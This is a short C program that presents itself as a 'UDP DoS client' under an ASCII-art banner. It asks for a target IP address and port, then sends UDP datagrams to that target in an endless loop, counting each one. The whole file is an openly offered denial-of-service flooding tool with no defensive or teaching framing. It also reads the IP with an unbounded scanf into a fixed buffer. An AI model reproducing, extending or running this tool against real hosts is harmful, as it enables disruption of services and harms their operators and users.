#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char ip[100];
    int port;
    char message[] = "";
    printf("\033[31m");
    printf(" /$$      /$$ /$$$$$$$   /$$$$$$   /$$$$$$ \n");
    printf("| $$$    /$$$| $$__  $$ /$$__  $$ /$$__  $$\n");
    printf("| $$$$  /$$$$| $$  \\ $$| $$  \\ $$| $$  \\__/\n");
    printf("| $$ $$/$$ $$| $$  | $$| $$  | $$|  $$$$$$ \n");
    printf("| $$  $$$| $$| $$  | $$| $$  | $$ \\____  $$\n");
    printf("| $$\\  $ | $$| $$  | $$| $$  | $$ /$$  \\ $$\n");
    printf("| $$ \\/  | $$| $$$$$$$/|  $$$$$$/|  $$$$$$/\n");
    printf("|__/     |__/|_______/  \\______/  \\______/ \n");
    printf("\n");
    printf("UDP DoS client made by v1s10n\n");
    printf("\n");
    printf("Enter IP address: ");
    scanf("%s", ip);
    printf("\n");
    printf("Enter port: ");
    scanf("%d", &port);
    printf("\n");
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("UDP socket creation failed");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        close(sock);
        return 1;
    }

    int i = 1;
    int packet_number = 1;
    while (i == 1) {
        sendto(sock, message, strlen(message), 0,
               (struct sockaddr*)&server_addr, sizeof(server_addr));
        printf("UDP packet %d sent to %s:%d\n", packet_number, ip, port);
        packet_number++;
    };

    close(sock);
    return 0;
}
